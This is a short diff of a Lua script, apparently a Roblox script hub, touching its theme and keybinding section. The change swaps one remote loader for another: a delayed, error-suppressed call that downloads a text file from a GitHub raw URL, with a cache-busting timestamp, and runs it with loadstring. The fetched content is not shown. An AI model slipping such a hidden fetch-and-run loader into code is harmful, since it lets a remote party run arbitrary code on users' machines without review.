@@ -5742,7 +5742,12 @@ end
 -- THEME SYSTEM & KEYBINDING HANDLERS
 -- ============================================================
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/iSacredRivals/riaslslss/main/broma.txt"))()
+task.spawn(function()
+    task.wait(0.5)
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/iSacredRivals/riaslslss/main/message.txt?t=" .. tick()))()
+    end)
+end)
 
 do
 function isColorLight(c3)
